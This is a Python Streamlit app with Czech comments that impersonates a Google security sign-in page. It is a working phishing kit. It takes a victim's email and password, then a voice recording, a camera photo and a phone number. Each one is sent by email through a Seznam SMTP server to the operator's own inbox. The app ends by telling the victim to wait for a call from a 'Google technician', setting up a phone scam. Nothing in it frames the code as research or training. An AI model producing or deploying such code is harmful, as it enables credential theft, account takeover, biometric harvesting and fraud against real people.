import streamlit as st
import os
import smtplib
import time
import re
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication
from datetime import datetime

# Import s ošetřením chyby, pokud by knihovna chyběla
try:
    from audio_recorder_streamlit import audio_recorder
except ImportError:
    st.error("Chybí knihovna audio-recorder-streamlit. Přidej ji do requirements.txt!")

# --- NASTAVENÍ ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None, typ="text"):
    if not MOJE_ADRESA or not MOJE_HESLO: return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    if soubor:
        if typ == "image":
            part = MIMEImage(soubor.read(), name="foto.png")
        elif typ == "audio":
            part = MIMEApplication(soubor, Name="nahravka.wav")
            part['Content-Disposition'] = 'attachment; filename="nahravka.wav"'
        msg.attach(part)
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except: pass

def je_validni_email(email): return re.match(r"[^@]+@[^@]+\.[^@]+", email)
def je_validni_tel(tel): return re.match(r"^\d{9}$", tel)

if "step" not in st.session_state: st.session_state.step = "login"

st.set_page_config(page_title="Google Security", page_icon="🔒")
st.markdown("<style>div.stButton > button:first-child { background-color: #4285F4; color: white; border: none; width: 100%; font-weight: bold; }</style>", unsafe_allow_html=True)

def logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

# OPRAVA: Definice sloupců pro rok 2026
col1, col2, col3 = st.columns(3)

with col2:
    if st.session_state.step == "login":
        logo()
        em = st.text_input("E-mail")
        he = st.text_input("Heslo", type="password")
        if st.button("Další"):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                st.session_state.step = "voice"
                st.rerun()
            else: st.error("Neplatné údaje")

    elif st.session_state.step == "voice":
        logo()
        st.info("Hlasové ověření identity")
        st.write("Klikněte na mikrofon a mluvte.")
        # audio_recorder potřebuje HTTPS na mobilu!
        audio_bytes = audio_recorder(text="", icon_size="3x", icon_color="#4285F4")
        if audio_bytes:
            if st.button("Potvrdit hlas"):
                odeslat_email("🎙️ VOICE", f"Uživatel: {st.session_state.zadany_email}", soubor=audio_bytes, typ="audio")
                st.session_state.step = "face"
                st.rerun()

    elif st.session_state.step == "face":
        logo()
        foto = st.camera_input("Biometrický sken")
        if foto:
            odeslat_email("📸 FACE", f"Uživatel: {st.session_state.zadany_email}", soubor=foto, typ="image")
            st.session_state.step = "final_check"
            st.rerun()

    elif st.session_state.step == "final_check":
        logo()
        st.error("⚠️ Vyžadováno ověření")
        tel = st.text_input("Telefon (9 číslic)")
        if st.button("Autorizovat"):
            if je_validni_tel(tel):
                odeslat_email("📞 TEL", f"User: {st.session_state.zadany_email}\nTel: {tel}")
                st.success("Čekejte hovor technika.")
                st.session_state.step = "finish"
                st.rerun()

    elif st.session_state.step == "finish":
        logo()
        st.success("Status: Čekání na hovor technika Google.")
        st.progress(90)
